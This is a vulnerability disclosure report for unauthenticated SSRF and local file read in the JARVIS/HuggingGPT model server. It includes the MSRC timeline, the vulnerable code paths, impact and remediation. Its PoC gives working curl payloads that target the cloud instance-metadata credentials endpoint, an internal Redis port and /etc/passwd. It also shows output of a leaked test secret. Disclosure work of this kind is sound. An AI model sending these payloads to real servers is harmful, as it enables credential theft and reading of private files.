https://github.com/microsoft/JARVIS

### Disclosure
- 13 June 2026 - reported via MSRC https://msrc.microsoft.com/report/vulnerability/VULN-195168
- 15 June 2026 - MSRC Case 122225 opened
- 22 July 2026 - MSRC closed with response: 
```
We have completed our review and assessed the reported issue as Low severity. While we acknowledge the behavior described in your report, our assessment determined that it does not meet the bar for immediate security servicing. The impact observed is limited to the demonstrated conditions and does not represent a security boundary bypass or a higher-risk security outcome.

The feedback from your report has been shared with the appropriate product team, and the issue is planned to be addressed in a future release. Given the current impact and severity, no CVE will be issued, and the Microsoft Security Response Center will not be tracking this issue further.
```


## Finding: Unauthenticated SSRF and local file read via img_url/audio_url in the HuggingGPT model server

Package: JARVIS / HuggingGPT (hugginggpt/server)

Affected Versions: Commit 7624cf3

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L (8.6 High)

CWE: CWE-918 Server-Side Request Forgery (with CWE-22/CWE-73 local file read)


### Summary

The HuggingGPT model-inference server fetches a caller-supplied `img_url` / `audio_url` server-side, with no validation of the target. The server binds all interfaces with no authentication and open CORS. An unauthenticated client can therefore make the server issue requests to internal-only services and cloud instance-metadata endpoints, and the audio path returns the fetched body directly; the same `load_image` helper also opens local filesystem paths, giving arbitrary local file read. Confirmed against the  `diffusers.load_image` and the verbatim `requests.get(audio_url)` sink: an internal listener was fetched and its secret returned, and the local-file branch read a host file.

### Details

`hugginggpt/server/models_server.py`, the `@app.route('/models/<path:model_id>', methods=['POST'])` handler (~line 364) passes the request JSON straight to the model pipelines:

```python
load_image(request.get_json()["img_url"])     # ~lines 409, 422, 444, 451, 455, 463, 505, 573, 589
# audio sinks (~lines 544/549/558): audio_url into the pipelines
```

`load_image` (from diffusers) does `PIL.Image.open(requests.get(url, stream=True).raw)` for any `http(s)://` URL and `PIL.Image.open(path)` for a local path (`os.path.isfile` branch), with no internal-IP/metadata filtering. The user-facing orchestrator `hugginggpt/server/awesome_chat.py` reaches the same sinks (`requests.get(audio_url).content` ~line 515; `load_image(img_url)` ~line 257) from the planner's resource arguments. Exposure: `waitress.serve(app, host="0.0.0.0", port=8005)` (`models_server.py` ~line 635) with `CORS(app)` and no auth; the orchestrator server binds `0.0.0.0:8004` likewise.

### PoC

**Prerequisites:** JARVIS repo cloned; Python with `diffusers`, `requests`, `Pillow` installed; an internal HTTP listener (e.g. `nc -l 9911`) to capture the fetched body. (The full model server requires torch + GPU weights; the sinks below were exercised directly in-process against the library code.)

```
curl -X POST http://TARGET:8005/models/ydshieh/vit-gpt2-coco-en \
  -H 'Content-Type: application/json' \
  -d '{"img_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
# audio_url returns the body directly:
#   -d '{"audio_url":"http://127.0.0.1:6379/"}'  (internal service)
# local file read via the load_image local-path branch:
#   -d '{"img_url":"/etc/passwd"}'
```

Validated against the `diffusers.load_image` and the verbatim `requests.get(audio_url)` sink line (against an internal listener standing in for `169.254.169.254`):

```
requests.get(audio_url) -> SSRF-INTERNAL-SECRET-TOKEN=ya29.SECRET_CREDENTIAL_LEAKED
load_image(img_url) -> requests.get fired (then UnidentifiedImageError on parse)
load_image local branch -> os.path.isfile('/etc/hostname') = True
```

The internal listener was hit and its secret returned verbatim through the `audio_url` sink; the `load_image` fetch fired (failing only on image parse, after the request). The route's unauth/`0.0.0.0` binding and the `request.get_json()["img_url"] -> load_image` flow are confirmed in source. (The full Flask server needs torch + GPU model weights to boot, so the sink helpers were exercised directly.)

### Impact

An unauthenticated network client of a HuggingGPT model/orchestrator server reaches internal-only services and cloud instance-metadata endpoints (credential theft); the `audio_url` path returns the response body (full-read SSRF), and the `load_image` local-path branch reads arbitrary host files. This is unauthenticated SSRF plus arbitrary local file read on the default configuration.

### Remediation

Before fetching `img_url` / `audio_url`, resolve the host and reject loopback, private (RFC1918), link-local (169.254.0.0/16, fe80::/10), unique-local, and reserved ranges plus metadata hostnames; enforce an http/https allowlist and reject local filesystem paths from request fields; disable/re-validate redirects and pin the validated IP. Require authentication on the model and orchestrator servers, or bind them to loopback by default rather than `0.0.0.0`.
